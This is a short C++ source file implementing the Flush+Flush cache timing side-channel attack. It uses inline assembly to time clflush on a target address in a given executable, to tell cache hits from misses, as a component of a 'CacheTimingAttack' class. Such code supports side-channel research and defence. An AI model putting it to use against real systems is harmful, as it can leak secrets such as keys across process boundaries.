#include "flush_flush.hpp"

using FF=FlushFlush;

unsigned int FF::time_hit(void* addr) const {

	unsigned int time=0;

	asm volatile (
			"movl (%1), %%eax\n"
			CTA_ASM_RDTSC_OP("clflush 0(%1)")

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

unsigned int FF::time_miss(void* addr) const {

	unsigned int time=0;

	asm volatile (
			"clflush 0(%1)\n"
			CTA_ASM_RDTSC_OP("clflush 0(%1)")

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

unsigned int FF::probe(void* addr) const {

	unsigned int time=0;

	sched_yield();

	asm volatile (
			CTA_ASM_RDTSC_OP("clflush 0(%1)")

			: "=a"(time)
			: "c"(addr)
			: "%esi", "%edi"
		);

	return time;
}

FF::FlushFlush(const char* exec, unsigned int offset) :
	CacheTimingAttack(exec, offset){};

FF::FlushFlush(const FF& other) : CacheTimingAttack(other){};
